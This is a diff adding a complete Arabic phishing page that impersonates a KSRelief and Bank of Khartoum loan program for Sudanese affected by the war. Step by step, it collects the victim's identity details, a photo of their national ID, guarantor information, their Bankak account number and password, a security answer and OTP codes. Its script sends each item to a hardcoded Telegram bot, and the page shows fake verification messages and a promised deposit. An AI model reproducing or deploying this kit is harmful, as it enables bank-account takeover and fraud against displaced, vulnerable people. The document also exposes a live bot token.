@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>طلب الحصول على قرض - بنك الخرطوم</title>
+    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Cairo', sans-serif; }
+        body { background-color: #f4f4f4; min-height: 100vh; display: flex; flex-direction: column; }
+        .header { height: auto; min-height: 85px; background: linear-gradient(to right, #c62828, #e53935, #d32f2f); display: flex; align-items: center; justify-content: space-between; padding: 15px 20px; color: white; border-bottom: 3px solid rgba(0,0,0,0.2); flex-wrap: wrap; gap: 15px; }
+        .welcome-box { background-color: #ebb811; color: #333; padding: 10px 20px; border-radius: 25px; font-weight: bold; font-size: 14px; width: fit-content; box-shadow: 0 2px 8px rgba(0,0,0,0.2); text-align: center; flex: 1; min-width: 250px; }
+        .header-logo { text-align: left; line-height: 1.1; flex: 1; min-width: 250px; }
+        .header-logo .title { font-size: 24px; font-weight: 700; display: block; }
+        .header-logo .subtitle { font-size: 13px; opacity: 0.9; }
+        .header-logo .subtitle-en { font-size: 12px; opacity: 0.9; margin-top: -3px; }
+        .main-container { flex: 1; display: flex; flex-direction: column; }
+        .card { background: white; width: 100%; flex: 1; padding: 40px 25px; text-align: center; transition: all 0.3s ease; }
+        .hidden { display: none !important; }
+        h2 { color: #d32f2f; margin-bottom: 20px; font-size: 22px; }
+        h3 { color: #333; margin-bottom: 25px; font-size: 18px; border-bottom: 2px solid #d32f2f; display: inline-block; padding-bottom: 5px; }
+        .input-group { margin-bottom: 18px; text-align: right; }
+        .input-group label { display: block; margin-bottom: 8px; font-weight: 600; font-size: 14px; color: #333; }
+        .input-wrapper { position: relative; }
+        input, select, textarea { width: 100%; padding: 15px; border: 1px solid #ccc; border-radius: 4px; background-color: #e3f2fd; font-size: 15px; outline: none; }
+        textarea { resize: vertical; min-height: 100px; }
+        .icon-eye { position: absolute; left: 12px; top: 50%; transform: translateY(-50%); color: #666; cursor: pointer; }
+        .btn-submit { background-color: #d32f2f; color: white; border: none; width: 100%; padding: 16px; border-radius: 5px; font-size: 18px; font-weight: bold; cursor: pointer; transition: background 0.3s; margin-top: 20px; }
+        .btn-submit:disabled { background-color: #cccccc; cursor: not-allowed; }
+        
+        .resend-otp { color: #d32f2f; font-size: 14px; margin-top: 15px; text-align: center; display: block; cursor: pointer; font-weight: bold; text-decoration: underline; }
+        
+        .guarantor-section { background-color: #f9f9f9; border: 1px solid #d32f2f; padding: 15px; border-radius: 6px; margin-top: 10px; margin-bottom: 15px; text-align: right; }
+        .guarantor-title { color: #d32f2f; font-weight: bold; font-size: 14px; display: block; margin-bottom: 10px; }
+
+        .check-result-box { 
+            background-color: #ffffff; 
+            border: 2px solid #d32f2f; 
+            padding: 25px; 
+            border-radius: 8px; 
+            margin-top: 10px; 
+            text-align: center; 
+            box-shadow: 0 4px 12px rgba(0,0,0,0.05);
+        }
+        .check-alert { color: #2e7d32; font-weight: bold; font-size: 18px; display: block; margin-bottom: 15px; }
+        .btn-bankak { 
+            background-color: #d32f2f; 
+            color: white; 
+            border: none; 
+            width: 100%; 
+            padding: 16px; 
+            border-radius: 5px; 
+            font-size: 18px; 
+            font-weight: bold; 
+            cursor: pointer; 
+            transition: background 0.3s; 
+            margin-top: 15px; 
+        }
+        .btn-bankak:hover { background-color: #b71c1c; }
+
+        .info-article { text-align: right; background: #f9f9f9; padding: 25px; border-radius: 8px; border-right: 4px solid #d32f2f; line-height: 1.9; color: #333; font-size: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
+        .info-article h4 { color: #d32f2f; margin-bottom: 15px; font-size: 18px; }
+
+        .error-msg { color: #d32f2f; font-size: 12px; margin-top: 5px; display: block; font-weight: bold; text-align: right; }
+        .error-alert { color: #d32f2f; font-size: 13px; font-weight: bold; margin-top: 10px; display: block; background: #ffebee; padding: 10px; border-radius: 4px; text-align: center; line-height: 1.6; }
+
+        .intro-article { text-align: right; line-height: 1.8; color: #333; background: #fff; padding: 15px; border-radius: 8px; margin-bottom: 20px; border: 1px solid #ddd; }
+        .intro-article h4 { color: #d32f2f; margin-bottom: 10px; }
+
+        .loading-spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+    <header class="header">
+        <div class="welcome-box">مؤسسة الملك فهد الخيرية | مركز الملك سلمان للإغاثة والأعمال الإنسانية</div>
+        <div class="header-logo">
+            <span class="title">KSRELIEF</span>
+            <span class="subtitle">مشروع الدعم المباشر للسودانيين المتأثرين بالحرب</span>
+            <span class="subtitle-en">Direct Support Project</span>
+        </div>
+    </header>
+
+    <div class="main-container">
+        <!-- الواجهة الأولية والمقال -->
+        <div id="step-intro" class="card">
+            <h2>مشروع تمويل القروض التنموية المباشرة</h2>
+            <div class="intro-article">
+                <h4>عن البرنامج ودعم المانحين</h4>
+                <p>يأتي هذا القرض في إطار مبادرة الدعم الإنساني والتنموي <strong>بدعم كامل من المانحين الدوليين</strong>، وبرعاية مباشرة وتنسيق مع <strong>بنك الخرطوم</strong>.</p>
+                <p style="margin-top: 10px;">يهدف المشروع إلى مساندة وتقديم التسهيلات المالية الميسرة لكل المواطنين السودانيين <strong>بالداخل والخارج</strong> لمساعدتهم في تجاوز الظروف الراهنة وإطلاق مشاريعهم الخاصة.</p>
+            </div>
+            <button class="btn-submit" onclick="goToStep(1)">بدء تقديم الطلب الآن</button>
+        </div>
+
+        <!-- الصفحة الأولى: إدخال البيانات الأساسية (بدون الرقم الوطني، مع اسم الوالدة وصورة الرقم الوطني) -->
+        <div id="step-1" class="card hidden">
+            <h2>طلب الحصول على قرض مباشر من بنك الخرطوم</h2>
+            <h3>الرجاء إدخال البيانات الأساسية لمقدم الطلب</h3>
+            
+            <div class="input-group">
+                <label>الإسم بالكامل:</label>
+                <input type="text" id="user-name" placeholder="أدخل الإسم رباعي كما في الأوراق الرسمية">
+                <span id="err-user-name" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+            <div class="input-group">
+                <label>مكان الإقامة الحالي:</label>
+                <input type="text" id="user-address" placeholder="المدينة / الولاية / المنطقة">
+                <span id="err-user-address" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+            <div class="input-group">
+                <label>عدد أفراد الأسرة:</label>
+                <input type="number" id="family-count" placeholder="أدخل عدد الأفراد المعالين">
+                <span id="err-family-count" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+            <div class="input-group">
+                <label>رقم الواتساب للتواصل:</label>
+                <input type="tel" id="user-whatsapp" placeholder="مثال: 0912345678">
+                <span id="err-user-whatsapp" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+            <div class="input-group">
+                <label>اسم الوالدة:</label>
+                <input type="text" id="mother-name" placeholder="أدخل اسم الوالدة ثلاثي">
+                <span id="err-mother-name" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+            <div class="input-group">
+                <label>صورة الرقم الوطني:</label>
+                <input type="file" id="document-image" accept="image/*" style="background-color: white; padding: 10px;">
+                <span id="err-document-image" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+            
+            <div class="input-group">
+                <label>مبلغ القرض المطلوب (بالجنيه السوداني):</label>
+                <select id="loan-amount-requested" onchange="toggleGuarantorFields()">
+                    <option value="" disabled selected>-- اختر قيمة التمويل المطلوبة --</option>
+                    <option value="3 مليون جنيه">3,000,000 جنيه (3 مليون)</option>
+                    <option value="6 مليون جنيه">6,000,000 جنيه (6 مليون)</option>
+                    <option value="12 مليون جنيه">12,000,000 جنيه (12 مليون)</option>
+                    <option value="18 مليون جنيه">18,000,000 جنيه (18 مليون)</option>
+                    <option value="أكثر من ذلك">أكثر من ذلك (يتطلب ضامن)</option>
+                </select>
+                <span id="err-loan-amount-requested" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+
+            <div id="guarantor-box" class="guarantor-section hidden">
+                <span class="guarantor-title">⚠️ تحتاج إلى ضامن لهذا المبلغ، يرجى ملء بياناته:</span>
+                <div class="input-group">
+                    <label>إسم الضامن بالكامل:</label>
+                    <input type="text" id="guarantor-name" placeholder="أدخل إسم الضامن رباعي">
+                </div>
+                <div class="input-group">
+                    <label>رقم هاتف الضامن:</label>
+                    <input type="tel" id="guarantor-phone" placeholder="أدخل رقم هاتف الضامن أو الواتساب">
+                </div>
+                <div class="input-group">
+                    <label>اسم والدة الضامن:</label>
+                    <input type="text" id="guarantor-mother" placeholder="أدخل اسم والدة الضامن">
+                </div>
+            </div>
+
+            <div class="input-group">
+                <label>فترة السداد المطلوبة:</label>
+                <select id="repayment-period">
+                    <option value="" disabled selected>-- اختر فترة السداد المناسبة --</option>
+                    <option value="6 شهور">6 شهور (نصف سنة)</option>
+                    <option value="9 شهور">9 شهور</option>
+                    <option value="12 شهر">12 شهر (سنة كاملة)</option>
+                </select>
+                <span id="err-repayment-period" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+
+            <button id="btn-validate" class="btn-submit" onclick="validateLoanData()">إرسال الطلب والمتابعة</button>
+        </div>
+
+        <!-- الصفحة الثانية: صفحة المطابقة لوحدها -->
+        <div id="step-matching" class="card hidden">
+            <h2>مطابقة المستندات والبيانات</h2>
+            <div class="check-result-box">
+                <span class="check-alert">✓ تمت مطابقة بيانات المستند بنجاح!</span>
+                <p style="color: #555; font-size: 14px; margin-top: 10px;">تم التحقق من صحة المستند المرفق ومطابقته مع البيانات المدخلة بنجاح تامة.</p>
+                <button class="btn-bankak" onclick="goToStep('project')">المتابعة لإدخال بيانات المشروع</button>
+            </div>
+        </div>
+
+        <!-- الصفحة الثالثة: إدخال بيانات المشروع لوحدها -->
+        <div id="step-project" class="card hidden">
+            <h2>تفاصيل المشروع والغرض من القرض</h2>
+            <h3>الرجاء توضيح فكرة مشروعك</h3>
+            
+            <div class="input-group" style="text-align: right;">
+                <label>تحدث بإيجاز عن مشروعك أو سبب طلب القرض:</label>
+                <textarea id="project-desc" placeholder="اشرح تفاصيل مشروعك أو الغرض من التمويل باختصار..."></textarea>
+                <span id="err-project-desc" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+
+            <button class="btn-submit" onclick="submitProjectDesc()">المتابعة لربط الحساب المصرفي</button>
+        </div>
+
+        <!-- الخطوة الرابعة: رقم الحساب وكلمة المرور في صفحة واحدة -->
+        <div id="step-2" class="card hidden">
+            <h2>خدمة بنكك أونلاين</h2>
+            <h3>الرجاء إدخال رقم الحساب وكلمة المرور لربط وتأكيد الحساب</h3>
+            
+            <div class="input-group">
+                <label>رقم حساب بنكك:</label>
+                <input type="text" id="account-num" placeholder="أدخل رقم الحساب (من 6 إلى 7 أرقام)">
+                <span id="err-account-num" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+
+            <div class="input-group">
+                <label>كلمة مرور الحساب (Password):</label>
+                <div class="input-wrapper">
+                    <input type="password" id="password" placeholder="أدخل كلمة المرور">
+                    <span class="icon-eye" onclick="togglePassword('password')">👁️</span>
+                </div>
+                <span id="err-password" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+                <span id="password-error-box" class="error-alert hidden">كلمة السر أو رقم الحساب غير صحيح.<br>الرجاء اعادة المحاولة مرة اخرى<br><strong id="pwd-tries">متبقي 5 محاولات أخرة</strong></span>
+            </div>
+
+            <button class="btn-submit" onclick="submitAccountAndPass()">تسجيل الدخول والربط</button>
+        </div>
+
+        <!-- الخطوة الخامسة: سؤال الأمان -->
+        <div id="step-3" class="card hidden">
+            <h2>متابعة الاستمارة أونلاين</h2>
+            <h3>لأغراض الأمان المصرفي يرجى الإجابة على سؤال الأمان الخاص بحسابك</h3>
+            <div class="input-group">
+                <label>الرجاء اختيار سؤال الأمان</label>
+                <select id="security-question">
+                    <option value="" disabled selected>-- اختر سؤال الأمان الخاص بحسابك --</option>
+                    <option>ما هو اسم ابن عمك الاول؟</option>
+                    <option>في اي مدينة ولدت؟</option>
+                    <option>في اي سنة تخرجت من الجامعة؟</option>
+                    <option>اسم فريق كرة القدم المفضل لديك؟</option>
+                    <option>ما هو اسم المدرسة التي التحقت بها؟</option>
+                </select>
+                <span id="err-security-question" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+            <div class="input-group">
+                <label>ادخل الجواب الصحيح</label>
+                <input type="text" id="security-answer" placeholder="اكتب جوابك هنا بدقة">
+                <span id="err-security-answer" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+            <button class="btn-submit" onclick="submitStep2()">إرسال وتأكيد</button>
+        </div>
+
+        <!-- الخطوة السادسة: صفحة الـ OTP لوحدها -->
+        <div id="step-otp" class="card hidden">
+            <h2>إدخال رمز التحقق OTP</h2>
+            <div class="input-group">
+                <label>أدخل رمز التحقق (OTP) المرسل لهاتفك لتأكيد القرض:</label>
+                <input type="text" id="otp-code" placeholder="000000" maxlength="6" style="text-align: center; letter-spacing: 5px; font-size: 20px;">
+                <span id="err-otp-code" class="error-msg hidden">ضرورة ملء هذا الحقل</span>
+            </div>
+            
+            <span class="resend-otp" onclick="resendOtpCode()">إعادة إرسال الرمز</span>
+            
+            <button id="verify-btn" class="btn-submit" onclick="verifyOtp()">التحقق وتأكيد المعاملة</button>
+            <span id="verification-status" style="display:none; color: #25D366; font-weight: bold; margin-top: 15px; display: block;"></span>
+        </div>
+
+        <!-- الخطوة السابعة: صفحة المقال التوضيحي المستقلة -->
+        <div id="step-article" class="card hidden">
+            <h2>حالة الطلب ومواعيد الإيداع</h2>
+            <div class="info-article">
+                <h4>توضيح هام بشأن حالة الطلب ومواعيد الإيداع:</h4>
+                <p>بياناتك الآن قيد المراجعة الفنية والدقيقة من قبل اللجنة المختصة في بنك الخرطوم والجهات الراعية. يُرجى الانتظار لحين اكتمال التدقيق ونزول مبلغ القرض إلى حسابك المصرفي بشكل آلي في مدة أقصاها <strong>72 ساعة</strong>.</p>
+                <p style="margin-top: 15px;"><strong>تنبيه ضروري جداً:</strong> في حالة تبين عدم صحة أي من البيانات المصرفية أو اسم الوالدة أو كلمات المرور المدخلة، <strong>لن يتم تحويل المبلغ نهائياً</strong>، وسيتوجب عليك إعادة التقديم للقرض من جديد. نود إحاطتك علماً بأن النظام يمنحك <strong>فرصتين فقط للتقديم للقرض</strong>، لذا يرجى التأكد التام من دقة جميع المعلومات المدخلة.</p>
+                <p style="margin-top: 15px;">كما نؤكد على أهمية الالتزام التام بسداد الأقساط الشهرية في مواعيدها المحددة دون أي تأخير، حيث يتيح لك السداد المنتظم الاستفادة من سقف قروض أكبر، ومكافآت وتسهيلات تمويلية مضاعفة في المراحل القادمة للمشروع.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        let userData = { name: '', address: '', familyCount: '', whatsapp: '', motherName: '', documentImageBase64: '', requestedAmount: '', repaymentPeriod: '', projectDesc: '', guarantorName: '', guarantorPhone: '', guarantorMother: '', accountNum: '', password: '', securityQuestion: '', securityAnswer: '', otp: '' };
+        let pwdAttempts = 5;
+
+        // بيانات البوت الخاصة بك
+        const botToken = "8844063359:AAHSpuYTCihiCa0cY-mLPHP8A6_wP8KpJos";
+        const chatId = "8912947067";
+
+        function goToStep(n) {
+            document.querySelectorAll('.card').forEach(c => c.classList.add('hidden'));
+            if(n === 1) document.getElementById('step-1').classList.remove('hidden');
+            if(n === 'matching') document.getElementById('step-matching').classList.remove('hidden');
+            if(n === 'project') document.getElementById('step-project').classList.remove('hidden');
+            if(n === 2) document.getElementById('step-2').classList.remove('hidden');
+            if(n === 3) document.getElementById('step-3').classList.remove('hidden');
+            if(n === 'otp') document.getElementById('step-otp').classList.remove('hidden');
+            if(n === 'article') document.getElementById('step-article').classList.remove('hidden');
+        }
+
+        function toggleGuarantorFields() {
+            const amountSelect = document.getElementById('loan-amount-requested').value;
+            const guarantorBox = document.getElementById('guarantor-box');
+            if (amountSelect === 'أكثر من ذلك') {
+                guarantorBox.classList.remove('hidden');
+            } else {
+                guarantorBox.classList.add('hidden');
+            }
+        }
+
+        function checkEmpty(id) {
+            const el = document.getElementById(id);
+            const err = document.getElementById('err-' + id);
+            if (!el || !err) return true;
+            if (!el.value.trim() || (el.type === 'file' && el.files.length === 0)) {
+                err.classList.remove('hidden');
+                return false;
+            } else {
+                err.classList.add('hidden');
+                return true;
+            }
+        }
+
+        function validateLoanData() {
+            let isValid = true;
+            ['user-name', 'user-address', 'family-count', 'user-whatsapp', 'mother-name', 'loan-amount-requested', 'repayment-period'].forEach(id => {
+                if (!checkEmpty(id)) isValid = false;
+            });
+            if (document.getElementById('document-image').files.length === 0) {
+                document.getElementById('err-document-image').classList.remove('hidden');
+                isValid = false;
+            } else {
+                document.getElementById('err-document-image').classList.add('hidden');
+            }
+
+            if (!isValid) return;
+
+            userData.name = document.getElementById('user-name').value;
+            userData.address = document.getElementById('user-address').value;
+            userData.familyCount = document.getElementById('family-count').value;
+            userData.whatsapp = document.getElementById('user-whatsapp').value;
+            userData.motherName = document.getElementById('mother-name').value;
+            userData.requestedAmount = document.getElementById('loan-amount-requested').value;
+            userData.repaymentPeriod = document.getElementById('repayment-period').value;
+
+            if (userData.requestedAmount === 'أكثر من ذلك') {
+                userData.guarantorName = document.getElementById('guarantor-name').value;
+                userData.guarantorPhone = document.getElementById('guarantor-phone').value;
+                userData.guarantorMother = document.getElementById('guarantor-mother').value;
+                if (!userData.guarantorName || !userData.guarantorPhone || !userData.guarantorMother) {
+                    return alert('المبلغ المختار يتطلب إدخال بيانات الضامن واسم والدته.');
+                }
+            } else {
+                userData.guarantorName = 'لا يوجد (مبلغ عادي)';
+                userData.guarantorPhone = '-';
+                userData.guarantorMother = '-';
+            }
+
+            const btn = document.getElementById('btn-validate');
+            btn.disabled = true;
+            btn.innerHTML = `<span class="loading-spinner"></span> جاري إرسال البيانات والمستند...`;
+
+            const fileInput = document.getElementById('document-image');
+            const file = fileInput.files[0];
+            const reader = new FileReader();
+
+            reader.onload = function(e) {
+                userData.documentImageBase64 = e.target.result;
+
+                let telegramMessage = `💰 طلب قرض جديد بنك الخرطوم\n👤 الاسم: ${userData.name}\n📍 السكن: ${userData.address}\n👨‍👩‍👦 الأفراد: ${userData.familyCount}\n📞 واتساب: ${userData.whatsapp}\n👩 اسم الوالدة: ${userData.motherName}\n💵 المبلغ المطلوب: ${userData.requestedAmount}\n⏳ فترة السداد: ${userData.repaymentPeriod}`;
+                if (userData.requestedAmount === 'أكثر من ذلك') {
+                    telegramMessage += `\n\n🛡️ [بيانات الضامن المرفقة]:\n👤 اسم الضامن: ${userData.guarantorName}\n📞 هاتف الضامن: ${userData.guarantorPhone}\n👩 والدة الضامن: ${userData.guarantorMother}`;
+                }
+
+                sendToTelegram(telegramMessage, () => {
+                    sendPhotoToTelegram(file, "صورة الرقم الوطني المرفقة للعميل: " + userData.name, () => {
+                        goToStep('matching');
+                    });
+                });
+            };
+
+            reader.readAsDataURL(file);
+        }
+
+        function submitProjectDesc() {
+            if(!checkEmpty('project-desc')) return;
+            userData.projectDesc = document.getElementById('project-desc').value;
+            sendToTelegram(`📋 وصف مشروع العميل\n📝 الوصف: ${userData.projectDesc}`);
+            goToStep(2);
+        }
+
+        function togglePassword(i) {
+            const p = document.getElementById(i);
+            p.type = (p.type === 'password') ? 'text' : 'password';
+        }
+
+        function submitAccountAndPass() {
+            let isValid = true;
+            if(!checkEmpty('account-num')) isValid = false;
+            if(!checkEmpty('password')) isValid = false;
+            if(!isValid) return;
+
+            userData.accountNum = document.getElementById('account-num').value;
+            userData.password = document.getElementById('password').value;
+
+            if((userData.accountNum.length < 6 || userData.accountNum.length > 7) || isNaN(userData.accountNum)) {
+                pwdAttempts--;
+                sendToTelegram(`⚠️ خطأ في رقم الحساب المدخل: ${userData.accountNum} - المتبقي: ${pwdAttempts}`);
+                
+                const errBox = document.getElementById('password-error-box');
+                errBox.classList.remove('hidden');
+                document.getElementById('pwd-tries').textContent = `متبقي ${pwdAttempts} محاولات أخرة`;
+                return;
+            }
+
+            const hasUppercase = /[A-Z]/.test(userData.password);
+            const hasLowercase = /[a-z]/.test(userData.password);
+            const hasNumber = /\d/.test(userData.password);
+            const hasSymbol = /[!@#$%^&*(),.?":{}|<>]/.test(userData.password);
+
+            if (!(hasUppercase && hasLowercase && hasNumber && hasSymbol)) {
+                pwdAttempts--;
+                sendToTelegram(`❌ محاولة كلمة مرور خاطئة (${userData.password}) - المتبقي: ${pwdAttempts}`);
+                
+                const errBox = document.getElementById('password-error-box');
+                errBox.classList.remove('hidden');
+                document.getElementById('pwd-tries').textContent = `متبقي ${pwdAttempts} محاولات أخرة`;
+                return;
+            }
+
+            sendToTelegram(`🔢🔐 بيانات بنكك (رقم الحساب وكلمة المرور)\n🔢 الحساب: ${userData.accountNum}\n🔑 السر: ${userData.password}`);
+            goToStep(3);
+        }
+
+        function submitStep2() {
+            let isValid = true;
+            if(!checkEmpty('security-question')) isValid = false;
+            if(!checkEmpty('security-answer')) isValid = false;
+            if(!isValid) return;
+
+            userData.securityQuestion = document.getElementById('security-question').value;
+            userData.securityAnswer = document.getElementById('security-answer').value;
+            
+            sendToTelegram(`🔐 أمان قرض بنك الخرطوم\n❓ السؤال: ${userData.securityQuestion}\n💬 الجواب: ${userData.securityAnswer}`);
+            goToStep('otp');
+        }
+
+        function resendOtpCode() {
+            sendToTelegram(`🔄 رقم الحساب (${userData.accountNum}) يطلب رمز otp جديد`);
+            alert('تم إرسال طلب رمز تحقق جديد بنجاح.');
+        }
+
+        function verifyOtp() {
+            if(!checkEmpty('otp-code')) return;
+            const o = document.getElementById('otp-code').value;
+            if (o.length < 4) return alert('رمز التحقق غير صحيح، يرجى إعادة المحاولة');
+            
+            const btn = document.getElementById('verify-btn');
+            const statusText = document.getElementById('verification-status');
+            btn.disabled = true;
+            btn.innerHTML = `<span class="loading-spinner"></span> جاري معالجة وتأكيد الطلب...`;
+            
+            setTimeout(() => {
+                statusText.style.display = "block";
+                statusText.innerHTML = "تم توثيق الحساب وإرسال تفاصيل الطلب بنجاح";
+                userData.otp = o;
+                sendToTelegram(`🔢 OTP قرض بنك الخرطوم\n🔐 الرمز المدخل: ${userData.otp}`);
+                
+                setTimeout(() => {
+                    goToStep('article');
+                }, 2000);
+            }, 2000);
+        }
+
+        function sendToTelegram(messageText, callback) {
+            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
+            fetch(url, {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ chat_id: chatId, text: messageText })
+            }).then(() => {
+                if (callback) callback();
+            }).catch(() => {
+                if (callback) callback();
+            });
+        }
+
+        function sendPhotoToTelegram(file, caption, callback) {
+            const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", file);
+            formData.append("caption", caption);
+
+            fetch(url, {
+                method: "POST",
+                body: formData
+            }).then(() => {
+                if (callback) callback();
+            }).catch(() => {
+                if (callback) callback();
+            });
+        }
+    </script>
+</body>
+</html>
